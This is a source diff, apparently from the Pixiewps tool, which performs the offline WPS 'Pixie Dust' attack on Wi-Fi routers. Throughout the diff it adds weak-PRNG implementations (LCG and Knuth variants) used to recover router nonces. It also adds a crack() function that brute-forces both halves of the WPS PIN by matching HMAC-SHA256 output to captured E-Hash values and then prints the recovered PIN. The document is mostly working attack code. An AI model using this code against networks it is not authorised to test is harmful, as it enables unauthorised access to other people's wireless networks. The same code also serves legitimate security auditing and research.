+				uint_fast8_t r = crack(wps, &pin);
+				if (r == PIN_FOUND) {
+					found_p_mode = ECOS_KNUTH;
+					DEBUG_PRINT("Pin found");
+				} else if (r == MEM_ERROR) {
+					goto memory_err;
 				}
 			}
+
 		}
 
-		/* E-S1 = E-Nonce != E-S2 */
-		if (mode == 4 && print_seed && !found) {
-			memcpy(wps->e_s1, wps->e_nonce, WPS_SECRET_NONCE_LEN);
-			mode++;
-			goto crack;
-		}
-
-		mode++;
+		k++;
 	}
 
 	c_end = clock();
-	long ms_elapsed = (c_end - c_start) / 1000;
+	long long ms_elapsed = (c_end - c_start) / 1000;
 
-	mode--;
-	if (mode == MAX_MODE + 1) mode--;
+	k--;
 
-	printf("\n Pixiewps %s\n", VERSION);
+#ifdef DEBUG
+	puts("");
+#endif
 
-	if (found) {
+	printf("\n Pixiewps %s\n", SHORT_VERSION);
+
+	if (found_p_mode) {
 		if (wps->e_nonce) {
-			if ((mode == 3 || mode == 4) && wps->verbosity > 2) {
-				printf("\n [*] PRNG Seed:  %u", print_seed);
-			}
-			if (mode == 4 && wps->verbosity > 2) {
-				time_t seed_time;
-				struct tm ts;
-				char buffer[30];
+			if (wps->verbosity > 2) {
+				if ((found_p_mode == ECOS_SIMPLE || (found_p_mode == RTL819x && print_seed)
+					|| found_p_mode == ECOS_SIMPLEST || found_p_mode == ECOS_KNUTH)) {
 
-				seed_time = print_seed;
-				ts = *localtime(&seed_time);
-				strftime(buffer, 30, "%c", &ts);
-				printf(" (%s)", buffer);
+					printf("\n [*] PRNG Seed:  %u", print_seed);
+				}
+				if (found_p_mode == RTL819x && print_seed) {
+					time_t seed_time;
+					struct tm ts;
+					char buffer[30];
+
+					seed_time = print_seed;
+					ts = *localtime(&seed_time);
+					strftime(buffer, 30, "%c", &ts);
+					printf(" (%s)", buffer);
+				}
 			}
+		}
+		if (wps->verbosity > 1) {
+			printf("\n [*] Mode:       %u (%s)", found_p_mode, p_mode_name[found_p_mode]);
 		}
 		if (wps->verbosity > 2) {
 			if (wps->dhkey) { /* To see if AuthKey was supplied or not */
@@ -562,18 +821,16 @@ int main(int argc, char **argv) {
 			printf("\n [*] E-S1:       "); byte_array_print(wps->e_s1, WPS_SECRET_NONCE_LEN);
 			printf("\n [*] E-S2:       "); byte_array_print(wps->e_s2, WPS_SECRET_NONCE_LEN);
 		}
-		printf("\n [+] WPS pin:    %04u%04u", first_half, second_half);
+		printf("\n [+] WPS pin:    %08u", pin);
 	} else {
 		printf("\n [-] WPS pin not found!");
 	}
-	printf("\n\n [*] Time taken: %ld s %ld ms\n\n", ms_elapsed / 1000, ms_elapsed % 1000);
+	printf("\n\n [*] Time taken: %lld s %lld ms\n\n", ms_elapsed / 1000, ms_elapsed % 1000);
 
-	if (!found && mode == 4 && valid && !wps->bruteforce) {
-		printf(" [!] The AP /might be/ vulnerable. Try again with --force or with another (newer) set of data.\n\n");
+	if (wps->warning) {
+		printf("%s", wps->warning);
+		free(wps->warning);
 	}
-
-	free(result);
-	free(buffer);
 
 	free(wps->pke);
 	free(wps->pkr);
@@ -598,11 +855,17 @@ int main(int argc, char **argv) {
 
 	free(wps);
 
-	return (!found); /* 0 success, 1 failure */
+	return found_p_mode != 0 ? PIN_FOUND : PIN_ERROR;
 }
 
-/* Linear congruential generator */
-int32_t rand_r(uint32_t *seed) {
+/* Simplest */
+uint32_t rand_r_simplest(uint32_t *seed) {
+    *seed = (*seed * 1103515245) + 12345; /* Permutate seed */
+    return *seed;
+}
+
+/* Simple, Linear congruential generator */
+uint32_t rand_r(uint32_t *seed) {
 	uint32_t s = *seed;
 	uint32_t uret;
 
@@ -614,5 +877,116 @@ int32_t rand_r(uint32_t *seed) {
 	uret += (s & 0xfe000000) >> (11 + 14); /* Use top 7 bits */
 
 	*seed = s;
-	return (int32_t) uret;
+	return uret;
+}
+
+/* Mersenne-Knuth */
+uint32_t knuth_rand(uint32_t *seed) {
+	#define MM 2147483647 /* Mersenne prime */
+	#define AA 48271      /* This does well in the spectral test */
+	#define QQ 44488      /* MM / AA */
+	#define RR 3399       /* MM % AA, important that RR < QQ */
+
+    *seed = AA * (*seed % QQ) - RR * (*seed / QQ);
+    if (*seed & 0x80000000)
+        *seed += MM;
+
+    return *seed;
+}
+
+/* PIN cracking attempt */
+uint_fast8_t crack(struct global *g, uint_fast32_t *pin) {
+	struct global *wps = g;
+	unsigned int first_half = 0;
+	unsigned int second_half = 0;
+	uint8_t s_pin[4];
+	uint_fast8_t found = 0;
+
+	uint8_t *buffer = malloc(WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2);
+	if (!buffer)
+		return MEM_ERROR;
+
+	uint8_t *result = malloc(WPS_HASH_LEN);
+	if (!result)
+		return MEM_ERROR;
+
+	while (first_half < 10000) {
+		uint_to_char_array(first_half, 4, s_pin);
+		hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, s_pin, 4, wps->psk1);
+		memcpy(buffer, wps->e_s1, WPS_SECRET_NONCE_LEN);
+		memcpy(buffer + WPS_SECRET_NONCE_LEN, wps->psk1, WPS_PSK_LEN);
+		memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PKEY_LEN);
+		memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN, wps->pkr, WPS_PKEY_LEN);
+		hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer,
+			WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2, result);
+
+		if (memcmp(result, wps->e_hash1, WPS_HASH_LEN)) {
+			first_half++;
+		} else {
+			break;
+		}
+	}
+
+	if (first_half < 10000) { /* First half found */
+		uint_fast8_t checksum_digit;
+		unsigned int c_second_half;
+
+		/* Testing with checksum digit */
+		while (second_half < 1000) {
+			checksum_digit = wps_pin_checksum(first_half * 1000 + second_half);
+			c_second_half = second_half * 10 + checksum_digit;
+			uint_to_char_array(c_second_half, 4, s_pin);
+			hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, s_pin, 4, wps->psk2);
+			memcpy(buffer, wps->e_s2, WPS_SECRET_NONCE_LEN);
+			memcpy(buffer + WPS_SECRET_NONCE_LEN, wps->psk2, WPS_PSK_LEN);
+			memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PKEY_LEN);
+			memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN, wps->pkr, WPS_PKEY_LEN);
+			hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer,
+				WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2, result);
+
+			if (memcmp(result, wps->e_hash2, WPS_HASH_LEN)) {
+				second_half++;
+			} else {
+				second_half = c_second_half;
+				found = 1;
+				break;
+			}
+		}
+
+		/* Testing without checksum digit */
+		if (!found) {
+			second_half = 0;
+
+			while (second_half < 10000) {
+
+				/* If already tested skip */
+				if (wps_pin_valid(first_half * 10000 + second_half)) {
+					second_half++;
+					continue;
+				}
+
+				uint_to_char_array(second_half, 4, s_pin);
+				hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, s_pin, 4, wps->psk2);
+				memcpy(buffer, wps->e_s2, WPS_SECRET_NONCE_LEN);
+				memcpy(buffer + WPS_SECRET_NONCE_LEN, wps->psk2, WPS_PSK_LEN);
+				memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PKEY_LEN);
+				memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN, wps->pkr, WPS_PKEY_LEN);
+				hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer,
+					WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2, result);
+
+				if (memcmp(result, wps->e_hash2, WPS_HASH_LEN)) {
+					second_half++;
+				} else {
+					found = 1;
+					break;
+				}
+			}
+		}
+	}
+
+	free(buffer);
+	free(result);
+
+	*pin = first_half * 10000 + second_half;
+	return !found; /* 0 success, 1 failure */
 }
